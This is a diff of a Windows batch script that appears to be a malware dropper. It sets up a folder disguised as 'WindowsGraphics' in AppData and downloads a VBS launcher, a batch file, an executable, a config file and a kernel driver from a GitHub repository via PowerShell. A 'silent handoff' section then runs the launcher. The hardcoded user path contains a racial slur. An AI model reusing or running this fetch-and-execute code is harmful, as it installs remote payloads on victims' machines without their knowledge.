@@ -14,37 +14,38 @@ if %errorLevel% neq 0 (
 if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"
 
 :: ============================================================
-:: 2. DIRECTORY SETUP & CLEANUP
+:: 2. DIRECTORY SETUP
 :: ============================================================
-set "workDir=C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
+set "workDir=C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\"
 if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
 cd /d "%workDir%"
 if not exist "driver" mkdir "driver" >nul 2>&1
 
-:: Delete the old/broken task from your screenshot before starting
-schtasks /delete /tn "MyUpdateTask" /f >nul 2>&1
-schtasks /delete /tn "ForexForgeSync" /f >nul 2>&1
-
-:: ============================================================
-:: 3. DOWNLOADS (With Cache-Buster)
-:: ============================================================
-:: Using the direct RAW GitHub domain for stability
-set "base=https://raw.githubusercontent.com/g00glecenter101-arch/Keep/main"
+:: Security Protocol Fix
 set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"
 
-:: Download the "Sticky" launcher (ONLY ONCE)
-powershell -Command "%psF%('%base%/launcher.vbs?v=%RANDOM%', 'launcher.vbs')"
+:: ============================================================
+:: 3. DOWNLOADS (Exact Links with Cache-Buster)
+:: ============================================================
 
-:: Download the rest of the payload
-powershell -Command "%psF%('%base%/boom.bat?v=%RANDOM%', 'boom.bat')"
-powershell -Command "%psF%('%base%/sigurd.exe?v=%RANDOM%', 'sigurd.exe')"
-powershell -Command "%psF%('%base%/Config.toml?v=%RANDOM%', 'Config.toml')"
-powershell -Command "%psF%('%base%/drivers/K7RKScan.sys?v=%RANDOM%', 'driver\k7RKScan.sys')"
+:: 1. The main Sticky Launcher (Added ?v=%RANDOM% to force update)
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs?v=%RANDOM%', 'launcher.vbs')"
+
+:: 2. The batch file
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat?v=%RANDOM%', 'boom.bat')"
+
+:: 3. The main EXE
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe?v=%RANDOM%', 'sigurd.exe')"
+
+:: 4. The Config file
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml?v=%RANDOM%', 'Config.toml')"
+
+:: 5. The Driver (Note: Corrected the folder path for the download)
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys?v=%RANDOM%', 'driver\K7RKScan.sys')"
 
 :: ============================================================
 :: 4. THE SILENT HANDOFF
 :: ============================================================
-:: This starts the launcher, which triggers the UAC and the Blue Window
 if exist "launcher.vbs" (
     start "" "wscript.exe" "launcher.vbs"
 )
